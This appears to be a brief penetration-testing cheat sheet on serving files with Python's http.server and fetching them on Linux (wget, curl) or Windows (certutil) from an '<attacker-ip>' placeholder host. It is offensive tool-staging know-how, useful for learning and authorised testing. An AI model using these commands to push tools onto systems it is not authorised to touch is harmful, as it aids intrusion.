
## Python server for file transmission 
If you need to transfer a file from one machine to another, you can follow this process:

#### Linux

```bash 
# machine 1
python3 -m http.server 8081

# machine 2
wget http://<attacker-ip>:<port>/<file>
# or
curl http://<attacker-ip>:<port>/<file> -o <output-file>
```

#### Windows

```bash 
# Linux machine 
python3 -m http.server 8081

# Windows machine 
certutil -urlcache -f http://<attacker-ip>:<port>/<file> <new_file_name>
```

